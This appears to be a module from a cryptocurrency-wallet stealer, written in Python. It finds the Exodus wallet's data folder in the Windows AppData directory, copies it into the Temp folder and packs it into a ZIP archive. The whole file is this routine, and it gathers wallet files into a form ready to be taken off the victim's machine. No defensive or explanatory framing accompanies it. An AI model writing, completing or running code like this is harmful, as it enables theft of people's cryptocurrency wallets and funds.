import shutil
import os.path 

client: str = os.path.expanduser("~")

class Files: 
    def __init__(self) -> None:
        pass
    
    def path_exists() -> bool:
        """Check if path exists that includes the Exodus data.

        Returns:
            bool: If the path exists or not.
        """
        if os.path.exists(client + "\\AppData\\Roaming\\Exodus"):
            return True
        else:
            return False
        
    def zip_files() -> bool:
        """ZIP the Exodus files that contain the data needed.

        Returns:
            bool: If we could ZIP the data needed or not.
        """
        try:
            shutil.copytree(client + "\\AppData\\Roaming\\Exodus", client + "\\AppData\\Local\\Temp\\Exodus")
            shutil.make_archive(client + "\\AppData\\Local\\Temp\\Exodus", "zip", client + "\\AppData\\Local\\Temp\\Exodus")
            
            return True
        except:
            return False